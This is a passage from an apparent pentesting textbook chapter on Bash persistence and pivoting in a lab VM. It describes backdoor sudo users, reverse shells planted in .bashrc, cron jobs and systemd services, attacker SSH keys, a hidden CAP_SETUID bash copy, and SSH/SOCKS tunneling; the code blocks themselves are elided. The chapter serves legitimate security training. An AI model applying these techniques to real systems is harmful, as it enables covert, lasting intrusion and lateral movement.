@@ -1,0 +1,1393 @@
+- en: '12'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Persistence and Pivoting
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: This chapter focuses on the techniques of **persistence** and **pivoting** in
+    pentesting, specifically using the Bash shell. We’ll cover methods for maintaining
+    long-term access to compromised systems and expanding access within a network.
+    Then, we’ll cover both basic and advanced persistence techniques, network pivoting
+    strategies, and methods for **lateral movement** . We’ll also address the importance
+    of proper cleanup procedures to minimize detectable traces of pentesting activities.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The sections in this chapter progress from fundamental persistence concepts
+    to more sophisticated approaches, followed by an exploration of network pivoting
+    tactics. In doing so, you’ll learn about using cron jobs, startup scripts, and
+    system-level services for persistence. We’ll cover various pivoting techniques,
+    including port forwarding and tunneling with SSH. We’ll conclude by providing
+    guidance on log cleaning, erasing command histories, and managing digital footprints
+    to maintain operational security during pentests.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this chapter, we’re going to cover the following main topic s:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The fundamentals of persistence with Ba sh
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Learning advanced persistence techniqu es
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The basics of network pivoting with Ba sh
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Mastering advanced pivoting and lateral movement
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Cleanup and covering tracks
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Technical requirements
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: The code for this chapter can be found at [https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter12](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter12)
+    .
+  prefs: []
+  type: TYPE_NORMAL
+- en: If you want to follow along with the exercises, you need to have a Kali and
+    **ESCALATE_LINUX** virtual machine available.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Enter the following command to install the prerequisites on your Kali Linux
+    system:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE0]'
+  prefs: []
+  type: TYPE_PRE
+- en: See [*Chapter 11*](B22229_11.xhtml#_idTextAnchor317) for the **ESCALATE_LINUX**
+    download link and configuration instructions.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Tip
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **ESCALATE_LINUX** virtual machine will be referred to as *target* through
+    the rest of this chapter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Some initial setup of the target is required before we can start the next section.
+    In [*Chapter 11*](B22229_11.xhtml#_idTextAnchor317) , we escalated privileges
+    to root and cracked the root password. The root password was **12345** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here, **user1** on the target has sudo rights, as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.1 – An entry from /etc/sudoers is shown](image/B22229_12_01.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 12.1 – An entry from /etc/sudoers is shown
+  prefs: []
+  type: TYPE_NORMAL
+- en: We’ll set the password for **user1** and use this account for all of the exercises
+    in this chapter. This will simulate us having exploited a user account with **sudo**
+    rights and set the stage for following along with the instructions.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Exploit the web application on the target again to get a shell as **user6**
+    . Please refer to [*Chapter 11*](B22229_11.xhtml#_idTextAnchor317) for guidance
+    if you need a refresher on how to do so.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Before you move on, you’ll need to establish an interactive shell. Enter the
+    **su root** command and observe that the output says **su: must be run from a
+    terminal** . To fix this, enter the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE1]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'Then, enter the **su root** command and enter **12345** as the password when
+    prompted. Finally, enter th e **echo "user1:12345" |** **chpasswd** command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.2 – Setting the password for user1](image/B22229_12_02.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 12.2 – Setting the password for user1
+  prefs: []
+  type: TYPE_NORMAL
+- en: Tip
+  prefs: []
+  type: TYPE_NORMAL
+- en: You’ve probably noticed by now that the shell is echoing your commands back
+    to you. To stop this, enter the **stty -** **echo** command.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Finally, we must enter **exit** to exit out of the root prompt and enter **su
+    user1** and **12345** when prompted for the password. You should now see a prompt
+    for **user1** , as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.3 – Switching users to the user1 account](image/B22229_12_03.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 12.3 – Switching users to the user1 account
+  prefs: []
+  type: TYPE_NORMAL
+- en: With these initial setup steps out of the way, you’re ready to dive in and take
+    on the exercises that follow.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The fundamentals of persistence with Bash
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Persistence refers to maintaining access to a compromised system after the initial
+    exploitation. For pentesters assessing Linux systems, understanding Bash-based
+    persistence techniques is essential. This section covers some fundamental methods
+    for establishing persistence using Bash.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Creating a new user in Bash
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'One basic technique is to create a new user account with root privileges. See
+    the following example for the commands to add a new user with root privileges:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE2]'
+  prefs: []
+  type: TYPE_PRE
+- en: These commands create a new user named **bashdoor** , add them to the **sudo**
+    group, and set their password to **password123** . The new user will have full
+    root access.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let’s take a closer look at how this works:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**useradd** : Creates the new user account'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**-m** : Creates a home directory'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**-s** : Sets the login shell to **bash**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**usermod -aG** : Adds the user to the **sudo** group'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**chpasswd** : Sets the password'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Let’s see this in action:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.4 – The process for adding a new user with full sudo privileges](image/B22229_12_04.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 12.4 – The process for adding a new user with full sudo privileges
+  prefs: []
+  type: TYPE_NORMAL
+- en: Adding a new user is noisy and is likely to be noticed. It may be less likely
+    to be noticed if you simply add a backdoor shell to an existing user. We’ll explore
+    this technique next.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Backdooring the Bash shell
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: The **~/.bashrc** file is executed whenever a new interactive Bash shell is
+    opened. We can add commands here.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Before continuing, exit the **bashdoor** Terminal session so that you’re back
+    at the prompt for **user1** . Enter the following command in your Kali Terminal
+    to ensure you’re ready to catch the reverse shell:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE3]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'In your **user1** shell, enter the following command, replacing the IP address
+    and port with you r own:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE4]'
+  prefs: []
+  type: TYPE_PRE
+- en: This adds a reverse shell command to the user’s **~/.bashrc** file. It will
+    connect back to the attacker’s machine each time a new Terminal is opened.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Then, establish a new session as **user1** with the **su** **user1** command.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You should see a new session as **user1** in the Terminal where you ran **nc**
+    , as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.5 – Our reverse shell has been established](image/B22229_12_05.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 12.5 – Our reverse shell has been established
+  prefs: []
+  type: TYPE_NORMAL
+- en: Tip
+  prefs: []
+  type: TYPE_NORMAL
+- en: If you make a mistake when using **echo** to append to the end of the **.bashrc**
+    file, it may be difficult to remove using an editor due to shell limitations.
+    You can enter the **sed -i '$d' filename** command to delete the last line of
+    a file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In addition to Bash reverse shell backdoors in **.bashrc** , scheduled jobs
+    are another effective way to maintain persistence on a Linux system in Bash.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Creating backdoor cron jobs
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Linux **cron jobs** are scheduled tasks that run automatically at specified
+    intervals. The **cron daemon** is a background service that executes these scheduled
+    commands, scripts, or programs.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Cron jobs are defined in crontab files, which contain the schedule and command
+    to run. Each line in a crontab file represents a single job and follows this format:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE5]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The five asterisks represent the following aspects:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Minute (0-59)
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Hour (0-23)
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Day of month (1-31)
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Month (1-12)
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Day of week (0-7, where 0 and 7 are Sunday)
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Users can edit their crontab file using the **crontab -e** command. Here’s
+    an example of a cron job that runs a script every day at 3:30 A.M.:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE6]'
+  prefs: []
+  type: TYPE_PRE
+- en: To view existing cron jobs, use the **crontab -** **l** command.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'For pentesters, cron jobs are important in post-exploitation and maintaining
+    access for several reasons:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Persistence** : Attackers can use cron jobs to maintain access to a compromised
+    system by scheduling tasks that re-establish connections or download updated malware.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Data exfiltration** : Cron jobs can be set up to send sensitive data from
+    the compromised system to an attacker-controlled server regularly.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Privilege escalation** : If an attacker can create or modify cron jobs running
+    as root or other privileged users, they can potentially escalate their privileges
+    on the system.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Backdoor maintenance** : Cron jobs can be used to periodically check for
+    and repair any backdoors that may have been removed or disabled.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Evading detection** : By scheduling malicious activities at specific times,
+    attackers can potentially avoid detection by timing their actions when system
+    administrators are less likely to be monitoring the system.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Automated reconnaissance** : Attackers can use cron jobs to gather information
+    about the system or network regularly, helping them plan further attacks or identify
+    new vulnerabilities.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Cron jobs can be used to maintain persistence by scheduling malicious commands.
+    Here’s an example:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE7]'
+  prefs: []
+  type: TYPE_PRE
+- en: This creates a cron job that attempts to establish a reverse shell connection
+    every 5 minutes.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s how it works:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**echo** : This adds the new cron job.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '***/5 * * * *** : This sets the schedule to every 5 minutes.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The command creates a reverse shell (change the IP address and port as required).
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**| crontab -** : This installs the new crontab.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Let’s see this in action. On the target system, we execute the command to create
+    the cron job, followed immediately by the command to list all cron jobs. On the
+    Kali system, within 5 minutes, we have our shell. This is demonstrated in the
+    following screenshots; the following one shows the commands that have been executed
+    on the target:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.6 – We create the cron job for persistence on the target system](image/B22229_12_06.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 12.6 – We create the cron job for persistence on the target system
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following figure shows us receiving the reverse shell on Kali:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.7 – We capture our reverse shell from the cron job on the Kali
+    system](image/B22229_12_07.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 12.7 – We capture our reverse shell from the cron job on the Kali system
+  prefs: []
+  type: TYPE_NORMAL
+- en: Understanding cron jobs is a key skill for privilege escalation and maintaining
+    access post-exploitation. Next, we’ll look into backdooring system files for persistence.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Backdooring system files for persistence
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Linux system **.service** files are configuration files that are used by systemd,
+    the init system, and service manager for many modern Linux distributions. These
+    files define how systemd should manage and control services, daemons, or background
+    processes.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following are the key aspects of **.** **service** files:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Location** : Typically stored in **/etc/systemd/system/** or **/usr/lib/systemd/system/**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Naming** **convention** : **[service_name].service**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Structure** : Consists of sections such as **[Unit]** , **[Service]** , and
+    **[Install]**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Purpose** : Defines service behavior, dependencies, start/stop commands,
+    and more'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Here’s a basic example of a **.** **service** file:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE8]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'This file defines the following:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: A description of the service
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: When it should start (after the network is up)
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The command to execute when starting the service
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Restart behavior if it fails
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The user under which the service should run
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Where the service should be installed in the system’s boot sequence
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Modifying system service files can provide persistence that survives reboots.
+    This is demonstrated in the following command, which can be found in this chapter’s
+    GitHub repository as **ch12_persistence.service.sh** . Please note that the ExecStart
+    Bash reverse shell command is one line and may wrap due to bo ok formatting:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE9]'
+  prefs: []
+  type: TYPE_PRE
+- en: This creates a new systemd service that establishes a reverse shell connection
+    on system startup.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s an explanation for this code:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**tee -a** creates the service file.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The **<<** redirection sends everything between the EOF labels to the service
+    file.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The **[Unit]** , **[Service]** , and **[Install]** sections define the service.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**ExecStart** specifies the command to run.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**systemctl enable** sets the service to start on boot.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**systemctl start** runs the service immediately.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Let’s see this in action. First, I’ll run the **python3 -m http.server** command
+    on my Kali system to run an HTTP server for file transfer. Then, I’ll use **wget**
+    on the target system to download the file from Kali, saving the file to **/tmp**
+    . Next, I’ll make the file executable and execute it. On Kali, I’ll check my Terminal
+    and find that I’ve received the reverse shell and have a session as the root user.
+    This is demonstrated in the following figures.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In the following figure, you can see that the Python server has been started
+    on the Kali system:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.8 – We run an HTTP server for file transfer](image/B22229_12_08.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 12.8 – We run an HTTP server for file transfer
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following figure shows the commands that were run on the target system
+    to download the script:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.9 – We download the script to the target system](image/B22229_12_09.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 12.9 – We download the script to the target system
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In the following figure, we’re making the script executable and running it:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.10 – We make the script executable and execute it to enable and
+    start the service](image/B22229_12_10.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 12.10 – We make the script executable and execute it to enable and start
+    the service
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now, we receive a reverse shell as root on Kali:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.11: We receive a reverse shell as root on Kali](image/B22229_12_11.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: 'Figure 12.11: We receive a reverse shell as root on Kali'
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this section, you learned how systemd system services work, how system service
+    files are structured, and how to use them for post-exploitation persistence. In
+    the next section, you’ll learn how to regain access at will by appending SSH keys
+    to a user profile.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Backdooring with SSH authorized keys
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: The SSH **authorized_keys** file is a mechanism for controlling SSH access to
+    a user account without requiring a password. This section will provide an overview
+    of how it works and its potential use for persistence.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s how the **authorized_keys** file works:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: It’s located in the **~/.ssh/authorized_keys** file for each user.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: It contains public keys, one per line.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: When a client attempts to connect, the server checks whether the client’s public
+    key matches any in this file.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: If a match is found, the connection is allowed without the need to prompt for
+    a password.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: After gaining access to a user account, if you find that SSH is accessible,
+    you can add your public key to a user’s **authorized_keys** file. This will allow
+    you to maintain SSH access, even if passwords are changed.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To add a key, run the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE10]'
+  prefs: []
+  type: TYPE_PRE
+- en: This command appends your public key to the **authorized_keys** file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let’s take a closer look:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**echo** : This outputs the specified text.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The text is the attacker’s public key. It starts with **ssh-rsa** and is followed
+    by the key data.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**>>** : This redirects and appends the output to the **authorized_keys** file.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**~/.ssh/authorized_keys** : This specifies the file path in the user’s home
+    directory.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: This technique provides a stealthy way to maintain access as it doesn’t require
+    system binaries to be modified or new user accounts to be created. However, it
+    may be detected by monitoring changes to **authorized_keys** files or through
+    SSH key audits.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Next, we’ll look at more advanced persistence techniques.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Learning advanced persistence techniques
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this section, we’ll explore a persistence technique that’s a bit more advanced
+    and might be more stealthy and therefore less likely to be caught during your
+    pentest.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Capabilities in Linux are a security feature that allows for fine-grained control
+    over what privileged operations processes can perform. They provide a way to grant
+    specific privileges to processes without the need to give them full root access.
+    This helps improve system security by following the principle of least privilege.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following are some key points about Linux’s capabilities:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: They break down the traditional all-or-nothing root privileges into smaller,
+    more specific permissions.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Capabilities are associated with executable files and processes, not users.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: There are over 40 distinct capabilities in modern Linux kernels.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'The following are some c ommon capabilities:'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**CAP_SETUID** : This capability allows a process to set the user ID of the
+    current process, effectively enabling it to switch to any user, including root.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**CAP_NET_BIND_SERVICE** : This allows us to bind to privileged ports (< **1024**
+    ).'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**CAP_CHOWN** : This allows us to change file ownership.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**CAP_DAC_OVERRIDE** : This allows us to bypass file read, write, and execute
+    permission checks.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Capabilities can be viewed with **getcap** and set on executable files using
+    **setcap** .
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Here’s an example of how to view the capabilities of a process:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE11]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'Here’s an example of how to set the capabilities of an executable:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE12]'
+  prefs: []
+  type: TYPE_PRE
+- en: This command grants the **CAP_SUID** capability to the specified executable.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To view the capabilities of a running process, run the following command, replacing
+    **PID** with the process ID you want to check:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE13]'
+  prefs: []
+  type: TYPE_PRE
+- en: The capability’s **=eip** suffix provides a way to precisely control which capabilities
+    are available to processes and how they can be used or passed on to child processes.
+    This granular control allows system administrators to implement the principle
+    of least privilege, granting only the specific capabilities required for a process
+    to function, rather than giving it full root privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **=eip** suffix refers to the *effective* , *inheritable* , and *permitted*
+    set of capabilities. This suffix is used when setting or viewing capabilities
+    on files or processes in Linux systems that support fine-grained privilege control.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To understand **=eip** , let’s break it down:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**e** – *effective* : These are the capabilities currently in use by the process.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**i** – *inheritable* : These capabilities can be inherited by child processes.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**p** – *permitted* : These are the capabilities that the process is allowed
+    to use.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'When you see a capability with the **=eip** suffix, it means that the capability
+    has been set for all three sets: effective, inheritable, and permitted.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'For example, if you were to set the **CAP_SETUID** capability on a file with
+    **=eip** , you could use a command like this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE14]'
+  prefs: []
+  type: TYPE_PRE
+- en: This command sets the **CAP_SETUID** capability as effective, inheritable, and
+    permitted for the specified file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s an example of using Linux capabilities to maintain persistent access
+    post-exploitation stealthily. This script demonstrates how to maintain access
+    using Linux capabilities. You can find it in this chapter’s GitHub repository
+    as **ch12_capabilities.sh** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE15]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'Let’s take a closer look at this code:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: First, it creates a hidden directory in **/tmp** .
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The script copies the Bash shell to this hidden location.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Then, it uses the **setcap** command to add the **CAP_SETUID** capability to
+    the copied shell. This capability allows the shell to set the user ID, effectively
+    giving it root-like privileges.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Directories such as **/tmp** and **/dev/shm** may be cleared on restart, so
+    be sure to check whether they’re mounted as a filesystem of the **tmpfs** type
+    before saving any files for persistence. If they’re mounted as **tmpfs** , then
+    you need to choose a different location; otherwise, your persistence mechanism
+    will be lost on restart. You can check this by entering the **mount** command
+    and **grep** for the directory location – for example, **/tmp** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: This technique is difficult to detect through standard system monitoring. It
+    doesn’t modify core system files or create new user accounts. However, it provides
+    a way to regain elevated privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Understanding and using Linux capabilities provides a more stealthy way to regain
+    privileged access for post-exploitation operations.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the next section, we’ll explore methods that are used to pivot through compromised
+    Linux Bash environments to gain access to networks that would otherwise be beyond
+    our reach.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The basics of network pivoting with Bash
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In the field of pentesting, it’s quite usual to utilize a breached system as
+    a stepping-stone for exploring and accessing additional networks linked to that
+    system. This section will explore the methodology that’s used to pivot through
+    a compromised Linux Bash environment.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'SSH port forwarding is a simple yet effective method for pivoting. It allows
+    you to tunnel traffic through an SSH connection, enabling access to otherwise
+    unreachable systems. In this section, we’ll cover two types of SSH port forwarding:
+    local and remote.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Local port forwarding lets you forward a port from your local machine to a
+    remote server through an SSH connection. The following command is an example of
+    local port forwarding:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE16]'
+  prefs: []
+  type: TYPE_PRE
+- en: This command establishes an SSH connection to **pivot_host** and forwards local
+    port **8080** to port **80** on **internal_server** through the **pivot_host**
+    . After executing this command, accessing **localhost:8080** on your local machine
+    will reach port **80** on **internal_server** . Local port forwarding is best
+    used when you need to reach a single server port on an internal network through
+    a compromised system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Remote port forwarding is the reverse of local port forwarding. It allows you
+    to forward a port from the remote SSH server to your local machine. The following
+    command exemplifies starting a remote port forward with SSH:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE17]'
+  prefs: []
+  type: TYPE_PRE
+- en: This command forwards port **8080** on **pivot_host** to port **80** on your
+    local machine. So, anyone accessing port **8080** on **pivot_host** will reach
+    port **80** on your local machine. Remote port forwarding is best used when you
+    need to exfiltrate data out of an internal network, such as when you need to receive
+    a reverse shell.
+  prefs: []
+  type: TYPE_NORMAL
+- en: SSH forward port forwarding can be inflexible because they are one-to-one port
+    mappings. A **Socket Secure** ( **SOCKS** ) proxy is a general-purpose proxy that
+    routes network traffic between a client and a server via a proxy server. Setting
+    up a SOCKS proxy with SSH allows for more flexible pivoting as it can handle various
+    types of traffic.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following SSH command initiates a dynamic SOCKS proxy:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE18]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'This command establishes an SSH connection to **pivot_host** and creates a
+    SOCKS proxy on local port **9050** . You can then configure your applications
+    (for example, web browser) to use this SOCKS proxy. For example, you can use this
+    proxy with **curl** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE19]'
+  prefs: []
+  type: TYPE_PRE
+- en: This command sends an HTTP request to **internal_server** through the SOCKS
+    proxy.
+  prefs: []
+  type: TYPE_NORMAL
+- en: You can also use the **proxychains** tool in combination with a SOCKS proxy.
+    This is most helpful when you need to use tools that aren’t proxy-aware with a
+    SOCKS proxy.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We need to configure proxychains before we can use it. The configuration file
+    is typically located at **/etc/proxychains4.conf** . Edit this file and change
+    the last line from **socks4 127.0.0.1 9050** to **socks5** **127.0.0.1 9050**
+    . Note that there’s a tab character between **socks5** and **127.0.0.1** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now that we have proxychains set up, let’s use it on Kali with **nmap** to
+    perform a TCP port scan. Here’s the basic syntax:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE20]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'Let’s take a closer look at this command:'
+  prefs: []
+  type: TYPE_NORMAL
